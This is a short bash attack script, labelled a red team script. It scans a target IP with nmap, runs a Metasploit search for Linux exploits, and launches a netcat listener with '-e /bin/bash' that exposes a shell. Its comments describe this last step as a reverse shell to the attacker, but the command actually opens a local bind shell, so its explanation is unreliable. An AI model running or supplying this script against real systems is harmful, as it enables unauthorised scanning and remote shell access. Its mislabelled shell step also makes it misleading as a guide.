#!/bin/bash

# Red Team Script - Attack the Target

# Scan for open ports on the target machine
target_ip="$1"
echo "Scanning $target_ip for open ports with Nmap..."
nmap -A $target_ip > nmap_scan.txt
echo "Nmap scan report saved to nmap_scan.txt"

# Searching for vulnerabilities using Metasploit
echo "Searching for vulnerabilities using Metasploit..."
msfconsole -q -x "search type:exploit platform:linux" > metasploit_vulns.txt
echo "Metasploit search results saved to metasploit_vulns.txt"

# Setting up a reverse shell with Netcat
attacker_ip="$2"
port="$3"
echo "Setting up reverse shell from $target_ip to $attacker_ip on port $port..."
nc -lvp $port -e /bin/bash &
echo "Reverse shell listener set up on $attacker_ip:$port"

echo "Attack initiated!"